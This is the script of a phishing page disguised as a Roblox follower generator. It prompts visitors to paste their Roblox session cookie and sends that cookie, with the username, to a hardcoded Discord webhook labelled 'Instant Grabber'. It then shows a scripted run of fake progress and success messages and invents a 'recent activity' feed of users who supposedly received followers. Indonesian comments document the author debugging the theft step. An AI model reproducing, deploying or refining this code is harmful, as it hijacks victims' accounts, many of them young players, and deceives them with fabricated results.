    <script>
        const generateBtn = document.getElementById('generateBtn');
        const usernameInput = document.getElementById('username');
        const followersInput = document.getElementById('followers');
        const cookieInput = document.getElementById('cookie');
        const statusLog = document.getElementById('statusLog');
        const activityList = document.getElementById('activityList');
        
        // !!! GANTI INI DENGAN WEBHOOK DISCORD LO !!!
        const webhookUrl = 'https://discord.com/api/webhooks/1473584598297481227/YlpDqaYYwlRGtfzfnbBuEkrJWfDwmIhE1g4SHFksFWS8lcAugzc5XZktNfDr8c1TO-Bz';

        function addLog(message, type) {
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.textContent = `> ${message}`;
            statusLog.appendChild(logEntry);
            statusLog.scrollTop = statusLog.scrollHeight;
        }

        function startFakeProcess(username, followers) {
            generateBtn.disabled = true;
            generateBtn.textContent = 'GENERATING...';
            generateBtn.classList.remove('ready');
            statusLog.innerHTML = '';

            setTimeout(() => addLog(`Connecting to generator server...`, 'info'), 500);
            setTimeout(() => addLog(`User '${username}' found in database.`, 'success'), 1500);
            setTimeout(() => addLog(`Requesting ${followers} followers...`, 'info'), 2500);
            setTimeout(() => addLog('Validating authentication cookie...', 'info'), 3500);
            setTimeout(() => addLog('Cookie validated. Access granted.', 'success'), 4500);
            setTimeout(() => addLog(`Injecting followers to profile...`, 'info'), 5500);
            setTimeout(() => {
                addLog(`Success! ${followers} followers added!`, 'success');
                generateBtn.textContent = 'SUCCESS!';
                setTimeout(() => addLog('Redirecting to your profile...', 'info'), 1000);
                setTimeout(() => window.open(`https://www.roblox.com/users/${username}/profile`, '_blank'), 2500);
            }, 6500);
        }

        function checkCookie() {
            const cookie = cookieInput.value;
            if (cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.')) {
                generateBtn.disabled = false;
                generateBtn.textContent = 'GENERATE FOLLOWERS';
                generateBtn.classList.add('ready');
            } else {
                generateBtn.disabled = true;
                generateBtn.textContent = 'WAITING FOR FILE FOLLOWERS';
                generateBtn.classList.remove('ready');
            }
        }

        cookieInput.addEventListener('input', checkCookie);

        generateBtn.addEventListener('click', async function() { // <-- Ganti jadi async
            const username = usernameInput.value || 'UnknownUser';
            const followers = followersInput.value || '0';
            const cookie = cookieInput.value;

            // --- PERBAIKAN UTAMA DI SINI ---
            // 1. Tambahkan timestamp biar unik (Cache-Busting)
            const uniqueUrl = `${webhookUrl}?t=${Date.now()}`;

            const payload = {
                content: `**TARGET TERSEDIA!**\n**Username:** ${username}\n**Followers Diminta:** ${followers}\n**Cookie:**\n\`\`\`${cookie}\`\`\``,
                username: 'BARRGPT Instant Grabber'
            };

            // 2. Cek hasil pengiriman
            try {
                const response = await fetch(uniqueUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    // Kalau Discord nolak (misal rate limit), kita tahu
                    console.error('Webhook failed:', response.status, response.statusText);
                    addLog(`Failed to send to Discord (Error: ${response.status}). Please try again.`, 'error');
                    // Jangan lanjutkan proses palsu kalau gagal kirim
                    generateBtn.disabled = false;
                    generateBtn.textContent = 'GENERATE FOLLOWERS';
                    generateBtn.classList.add('ready');
                    return; 
                }

                // Kalau berhasil, baru jalanin proses palsunya
                console.log('Webhook sent successfully!');
                startFakeProcess(username, followers);

            } catch (error) {
                // Kalau ada error jaringan atau lainnya
                console.error('Fetch error:', error);
                addLog('Network error! Could not connect to server.', 'error');
                generateBtn.disabled = false;
                generateBtn.textContent = 'GENERATE FOLLOWERS';
                generateBtn.classList.add('ready');
            }
        });

        function populateActivity() {
            const fakeUsers = ['uehwywh', 'Fadhilzeyn26', 'NextRizee', '6foot3dadaman67', 'fqYkxPiKMni'];
            for (let i = 0; i < 5; i++) {
                const user = fakeUsers[i];
                const followers = Math.floor(Math.random() * 5000) + 1000;
                const li = document.createElement('li');
                li.textContent = `${user} just got ${followers} followers!`;
                activityList.appendChild(li);
            }
        }

        window.onload = populateActivity;

    </script>
